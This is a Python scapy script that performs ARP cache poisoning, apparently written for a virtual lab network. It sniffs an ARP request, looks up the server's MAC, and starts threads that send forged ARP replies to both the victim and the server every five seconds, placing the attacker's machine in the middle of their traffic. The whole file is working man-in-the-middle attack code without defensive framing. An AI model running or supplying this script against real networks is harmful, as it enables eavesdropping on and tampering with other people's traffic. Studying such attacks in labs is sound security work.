from scapy.all import *
from threading import Thread
ipAttacker = "192.168.56.103"
def arp_poison(ipVictim, macVictim, ipServer, macAttacker, interface):
    print("poisoning")
    arp = Ether()/ARP()
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipServer
    arp[ARP].hwdst = macVictim
    arp[ARP].pdst = ipVictim
    sendp(arp, iface=interface)

def arp_listener(macAttacker, interface, macServer = None):
    print("listening")
    pkg_arp = sniff(filter="arp", count=1, iface=interface)
    ipVictim = pkg_arp[0][ARP].psrc
    macVictim = pkg_arp[0][ARP].hwsrc
    ipServer = pkg_arp[0][ARP].pdst
    if pkg_arp[0][ARP].op == 2:
        print("ARP Reply")
    elif pkg_arp[0][ARP].op == 1:
        print("ARP Request")
        Thread(target=persistentPoisoningVictim, args=(ipVictim, macVictim, ipServer,macAttacker, interface)).start()
        #find the server mac
        if macServer == None:
            arp_req = Ether()/ARP()
            arp_req[Ether].src = macAttacker
            arp_req[ARP].hwsrc = macAttacker
            arp_req[ARP].psrc = ipVictim
            arp_req[ARP].hwdst = "ff:ff:ff:ff:ff:ff"
            arp_req[ARP].pdst = ipServer
            sendp(arp_req, iface=interface)
            pkg_arp = sniff(filter="arp", count=1, iface=interface)
            macServer = pkg_arp[0][ARP].hwsrc
        Thread(target=persistentPoisoningServer, args=(ipServer, macServer, ipVictim, macAttacker, interface)).start()

def persistentPoisoningVictim(ipVictim, macVictim, ipServer, macAttacker, interface):
    while True:
        print("poisoning victim")
        #poison the victim
        arp_poison(ipVictim, macVictim, ipServer, macAttacker, interface)
        time.sleep(5)

def persistentPoisoningServer(ipServer, macServer, ipVictim, macAttacker, interface):
    while True:
        print("poisoning server")
        #poison the victim
        arp_poison(ipServer, macServer, ipVictim, macAttacker, interface)
        time.sleep(5)


